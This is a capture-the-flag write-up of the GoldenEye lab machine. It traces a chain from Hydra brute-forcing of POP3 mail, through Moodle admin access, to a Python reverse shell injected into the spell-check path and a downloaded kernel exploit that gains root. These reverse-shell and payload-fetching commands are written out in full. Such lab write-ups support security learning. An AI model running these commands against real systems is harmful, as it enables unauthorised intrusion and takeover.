# CTF Write-up: GoldenEye — TryHackMe / VulnHub

| | |
|---|---|
| **Platform**   | TryHackMe / VulnHub |
| **Machine**    | GoldenEye: 1 |
| **Difficulty** | Intermediate |
| **Tags**       | `OSINT` `POP3` `Hydra` `Moodle` `Spell-Check RCE` `Kernel Exploit` |

---

## Introduction

GoldenEye is a story-driven box themed around the James Bond film of the same name. The machine has a narrative woven into the attack path — you're hunting down Boris and Natalya, cracking emails, pivoting through a Moodle instance, and ultimately exploiting a kernel vulnerability. It's a longer chain than most easy rooms but immensely satisfying to complete.

---

## Step 1 — Reconnaissance (Nmap)

```bash
nmap -p- -A -T4 <target-ip>
```

Key open ports:

- **Port 80** — HTTP
- **Port 25** — SMTP
- **Port 55007** — POP3

Port 80 was the starting point. The POP3 service on the non-standard port 55007 would become crucial a few steps in.

---

## Step 2 — Web Enumeration — Encoded Credentials in Source

Browsing to port 80 shows a thematic intro page. Checking the page source revealed a linked JavaScript file — `terminal.js`. Opening it exposed two usernames: `boris` and `natalya`. It also contained a password that was HTML-entity encoded.

Decoded the encoded password in Burp Suite's Decoder tab.

Navigating to `/sev-home/` prompted for HTTP basic authentication. Used "boris" with the decoded password to log in successfully.

---

## Step 3 — POP3 Brute Force (Hydra)

The page mentioned additional services. Turned attention to POP3 on port 55007. Used Hydra to brute force credentials for both users:

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt <target-ip> -s 55007 pop3
```

Found boris's POP3 password. Connected with Telnet to read his emails:

```bash
telnet <target-ip> 55007
USER boris
PASS <password>
LIST
RETR 1
```

Boris's emails referenced Natalya. Brute-forced her POP3 credentials the same way:

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt <target-ip> -s 55007 pop3
```

Read Natalya's emails. One of them contained credentials for a user called `xenia` and a reference to an internal domain:

```
severnaya-station.com/gnocertdir
```

Also noted: the machine's IP needed to be mapped to the hostname in `/etc/hosts` for the internal site to resolve.

---

## Step 4 — Moodle Enumeration

Added the entry to `/etc/hosts`:

```bash
echo "<target-ip> severnaya-station.com" >> /etc/hosts
```

Browsed to `severnaya-station.com/gnocertdir` — a Moodle learning management system login page. Logged in as `xenia` with the credentials from Natalya's email.

Found a message on the platform mentioning a user called `doak`. Ran Hydra against POP3 again:

```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt <target-ip> -s 55007 pop3
```

Cracked doak's POP3 password. Read his emails — they contained credentials for a user named `dr_doak` on the Moodle platform.

Logged into Moodle as `dr_doak`. Found a private file in their files section — an image. Downloaded it and ran exiftool:

```bash
exiftool <image-file>
```

The Description field contained a Base64-encoded string. Decoded it:

```bash
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# Result: xWinter1995x!
```

That was the admin password. Username: `admin`.

---

## Step 5 — Moodle Admin → Reverse Shell

Logged in as `admin`. In the Moodle admin settings, navigated to:

`Site Administration → Plugins → Text editors → TinyMCE HTML editor`

Changed the "Spell Engine" setting to `PSpellShell`, then updated the spell-check path with a Python reverse shell:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-ip>",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Started a Netcat listener:

```bash
nc -nvlp 443
```

Triggered the spell-check by clicking the spell check button in the Moodle text editor. The shell connected back as `www-data`.

Upgraded the shell:

```bash
python -c "import pty; pty.spawn('/bin/bash');"
```

---

## Step 6 — Privilege Escalation (Kernel Exploit)

Ran LinPEAS to enumerate the system. The kernel version flagged as potentially vulnerable.

Searched ExploitDB and found exploit **37292** — a local privilege escalation for the running kernel version.

Important detail: the target machine didn't have `gcc` installed, only `cc`. Modified the compile command in the exploit before building:

Changed:

```c
lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

To:

```c
lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Compiled on the attack machine, served via SimpleHTTPServer:

```bash
cc 37292.c -o ofs
python -m SimpleHTTPServer 80
```

On the target:

```bash
cd /tmp
wget http://<your-ip>/ofs
chmod +x ofs
./ofs
```

Root shell.

---

## Step 7 — Flags

```bash
cat /home/<user>/user.txt   # FLAG: [user flag here]
cat /root/root.txt          # FLAG: [root flag here]
```

---

## Summary & Takeaways

A genuinely multi-stage chain:

1. Encoded password in `terminal.js` → boris's HTTP credentials.
2. Hydra on POP3 (port 55007) for boris, natalya, and doak.
3. Email chain → xenia Moodle login → dr_doak → image with admin creds.
4. Moodle admin → PSpellShell + system path = reverse shell.
5. Kernel exploit (37292, compile with `cc` not `gcc`) = root.

The standout lesson is that credential trails often span multiple services. Following the chain patiently — from web source to email to platform to admin panel — is what wins this box.
